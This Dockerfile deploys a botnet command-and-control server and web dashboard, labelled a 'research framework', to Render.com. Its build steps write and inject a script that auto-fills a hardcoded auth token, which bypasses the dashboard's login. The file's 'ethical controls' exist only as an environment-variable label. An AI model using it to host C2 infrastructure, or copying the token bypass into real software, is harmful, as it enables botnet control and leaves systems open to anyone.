# Simplified Dockerfile for Render.com Deployment
# Advanced Botnet Research Framework

FROM python:3.9-slim

# Install system dependencies
RUN apt-get update && apt-get install -y \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Create application directory
WORKDIR /app

# Create web directory
RUN mkdir -p /app/web

# Copy web dashboard files
COPY c2-server/web-dashboard/ /app/web/

# Copy Python server
COPY c2-server/python-server/server.py /app/server.py

# Create demo authentication token script
RUN echo 'document.addEventListener("DOMContentLoaded", function() {' > /app/web/auth-demo.js && \
    echo '  if (!localStorage.getItem("c2_auth_token")) {' >> /app/web/auth-demo.js && \
    echo '    localStorage.setItem("c2_auth_token", "demo_token_research_mode");' >> /app/web/auth-demo.js && \
    echo '  }' >> /app/web/auth-demo.js && \
    echo '});' >> /app/web/auth-demo.js

# Add authentication script to index.html
RUN sed -i 's|<script src="js/dashboard.js"></script>|<script src="auth-demo.js"></script>\n    <script src="js/dashboard.js"></script>|' /app/web/index.html

# Environment variables
ENV RESEARCH_MODE=true
ENV ETHICAL_CONTROLS=strict

# Expose port
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=30s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# Start the server
CMD ["python3", "/app/server.py"]